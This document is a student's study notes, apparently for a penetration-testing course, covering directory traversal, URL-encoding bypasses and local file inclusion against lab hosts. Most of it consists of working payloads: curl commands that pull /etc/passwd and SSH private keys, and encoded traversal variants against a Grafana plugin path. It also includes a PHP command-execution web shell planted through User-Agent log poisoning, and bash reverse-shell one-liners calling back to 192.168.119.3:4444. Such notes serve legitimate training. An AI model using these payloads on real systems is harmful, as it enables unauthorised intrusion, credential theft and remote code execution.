# 9. Common Web Application Attacks
no notes

## 9.1. Directory Traversal

### 9.1.1. Absolute vs Relative Paths
Directory Traversal can be done using either Absolute OR Relative paths depending on the vulnerability

### 9.1.2. Identifying and Exploiting Directory Traversals

Linux webroot is often times /var/www/html/

PHP uses $_GET2 to manage variables via a GET request

Directory traversal vulnerabilities are mostly used for gathering information. As mentioned before, if we can access certain files containing sensitive information, like passwords or keys, it may lead to system access.

SSH keys are usually located in the home directory of a user in the .ssh folder -- example of directory traversal to get SSH keys
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

Avoid using browser to read information. use burp or curl, like so
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

Save SSH key into filecalled dt_key, adjust permissions (failing to change permissions will cause unprotected keyfile error)
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.com

Windows /etc/hosts is C:\Windows\System32\drivers\etc\hosts (we use this file because its readable by all local users)

Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd, check for private keys in their home directory, and use them to access the system via SSH
In Windows there is really no way to do this...

Windows IIS webserver logs are at C:\inetpub\logs\LogFiles\W3SVC1\

For windows targets try both forward and backslashes...

Lab Notes
If you do not chmod the ssh key not only will it fail, but it will also ask for password

### 9.1.3. Encoding Special Characters

curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

url encode (aka percent encode) curl for ../ traversal attack
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
NOTE: 2e hexidecimal is 46. 46 in ascii is a DOT or period ".". no need to encode slashes as those are naturally part of URLS

Lab notes: Q1 had us look for the flag in /opt/passwords... is the /opt folder supposed to be something we check? Is there a way that we can automate directory traversal to locate low hanging fruit?
This reddit has a couple of good answers on some files to check.. one mentioned loading Seclists/fuzzing/LFI into burp intruder as a way to automate -- https://www.reddit.com/r/oscp/comments/1ae050m/path_traversal/

WORKING PAYLOAD -- NOTE: REPLACING curl from any payloads that failed with the word FAILED so that they do not populate in a search!
curl --path-as-is http://192.168.162.16:3000/public/plugins/alertlist/../../../../../../../../etc/passwd

CASE: only encoding the dots in between /'s -- passed
curl --path-as-is http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

CASE: Everything is encoded -- failed
failed %68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%36%32%2e%31%36%3a%33%30%30%30%2f%70%75%62%6c%69%63%2f%70%6c%75%67%69%6e%73%2f%61%6c%65%72%74%6c%69%73%74%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

CASE: everything between alertlist/ and /etc/passwd is encoded -- pass
curl http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

CASE: Slash after alertlist is encoded -- fail
failed http://192.168.162.16:3000/public/plugins/alertlist%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

CASE: slash in /etc/passwords are replaced -- pass
curl http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd

CASE: encoding the word public in the uri -- pass
curl http://192.168.162.16:3000/%70%75%62%6c%69%63/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd

CASE: Encoding the slashes in front and behind plugins -- fail
failed http://192.168.162.16:3000/%70%75%62%6c%69%63%2fplugins%2falertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd

Conclusion: I have to be careful which slashes I encode.... I can encode any slashes after the first one in alertslist/ and I can encode any word in between slashes after the hostname:port. 
However encoding slashes in the regular url will break the request.... Is this observation specific to Grafana or with any directory traversal?

Something else I noticed is that non-encoded payloads need the --path-as-is argument. Encoded payloads work the same with or without the argument

## 9.2. File Inclusion Vulnerabilities
no notes

### 9.2.1. Local File Inclusion (LFI)
directory traversal -- obtain the contents of a file outside of the web server's web root -- read files
file inclusion -- include a file in the application's running code. -- execute local or remote files, also display content of non-executable file
Log Poisoning --  modifying data sent to a webapp so that the logs have executable code

Apache Access.log File Inclusion
access.log is in /var/log/apache2/

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
They noticed that the log has an entry of a User Agent which is a user controlled header

User-Agent payload in burp:
<?php echo system($_GET['cmd']); ?>
$_Get -- super global variable which lets you pull the contents of "cmd" from /index.php?page=admin.php&cmd=whoami
echos the results of system(stuff)

GET /meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=ls%20-la 
%20 -- encoding of white space in command
Previously we uploaded <?php echo system($_GET['cmd']); ?> to the log. Doing a directory traversal to that file executes the php code in the file which grabs the cmd parameter.
the cmd parameter has ls -la with the space inbetween url encoded

bash one-liner for reverse shell
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

php uses bourne for shell instead of bash... will need to use the following one-liner instead
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

php bash one-liner with encoding
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

start a netcat listener 
nc -nvlp 4444

XAMPP apache logs are stored at C:\xampp\apache\logs\access.log

We can also do LFI in Pearl, ASP, ASPE, JSP or even Node.js

Lab notes
sometimes sudo -I will give you root if the account has the correct permissions

### 9.2.2. PHP Wrappers

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
Extra Reading   
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
9.2.2. PHP Wrappers


9.2.1. Local File Inclusion (LFI)
https://owasp.org/www-community/attacks/Log_Injection
https://httpd.apache.org/docs/2.4/logs.html
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent
https://www.php.net/manual/en/function.system.php
https://www.php.net/manual/en/function.echo.php
https://en.wikipedia.org/wiki/Input_Field_Separators
https://www.w3schools.com/tags/ref_urlencode.asp
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
https://en.wikipedia.org/wiki/Bourne_shell
https://www.apachefriends.org/index.html
https://www.perl.org/
https://en.wikipedia.org/wiki/ASP.NET
https://en.wikipedia.org/wiki/Active_Server_Pages
https://en.wikipedia.org/wiki/Jakarta_Server_Pages
https://nodejs.org/en/


9.2. File Inclusion Vulnerabilities
https://en.wikipedia.org/wiki/File_inclusion_vulnerability
https://www.php.net/manual/en/wrappers.php

9.1.3. Encoding Special Characters
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
https://en.wikipedia.org/wiki/Web_application_firewall
https://en.wikipedia.org/wiki/Percent-encoding
https://www.w3schools.com/tags/ref_urlencode.asp


9.1.2. Identifying and Exploiting Directory Traversals
https://en.wikipedia.org/wiki/Directory_traversal_attack
https://www.php.net/manual/en/reserved.variables.get.php
https://portswigger.net/burp
https://curl.se/
https://en.wikipedia.org/wiki/Internet_Information_Services
https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage
https://www.ietf.org/rfc/rfc1738.txt
